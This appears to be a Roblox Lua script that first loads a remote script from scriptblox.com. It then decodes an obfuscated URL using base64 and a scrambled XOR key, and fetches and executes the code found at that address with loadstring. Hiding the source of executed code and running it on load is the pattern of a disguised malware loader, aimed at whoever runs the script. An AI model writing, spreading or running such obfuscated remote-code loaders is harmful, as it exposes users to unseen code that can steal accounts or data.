pcall(function() loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_96f1c9235ebb", "1.0.0", false) end)
local function _d(s,p,o)
  local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  local r={} for i=1,#B do r[B:byte(i)]=i-1 end
  local k={} for i,x in ipairs(o) do k[i]=p[x] end
  k=table.concat(k)
  local x8=function(a,b)
    if bit32 and bit32.bxor then return bit32.bxor(a,b) end
    local v,m=0,1
    for _=1,8 do local u,w=a%2,b%2 if u~=w then v=v+m end a,b,m=(a-u)/2,(b-w)/2,m*2 end
    return v
  end
  local raw,bits,nb={},0,0
  s=s:gsub("[^%w%+/]","")
  for i=1,#s do
    bits=bits*64+(r[s:byte(i)] or 0) nb=nb+6
    if nb>=8 then nb=nb-8 local q=2^nb raw[#raw+1]=math.floor(bits/q)%256 bits=bits%q end
  end
  local out={}
  for i=1,#raw do
    out[i]=string.char(x8(x8(raw[i],k:byte((i-1)%#k+1)),((i-1)*7+13)%256))
  end
  return table.concat(out)
end

local _u=_d(
  'MRldczdcO11DfF4Bfn97' ..
  'Q2rSy4q768W9i6nb15vP' ..
  'pKbntvRtGGhSKz56OWFB' ..
  'K1M=',
  {"Qx7","!mV","k9d","Ty2","#Lp"}, {4,2,5,1,3}
)
local _ok,_e=pcall(function() return loadstring(game:HttpGet(_u))() end)
if not _ok then warn("load failed") end
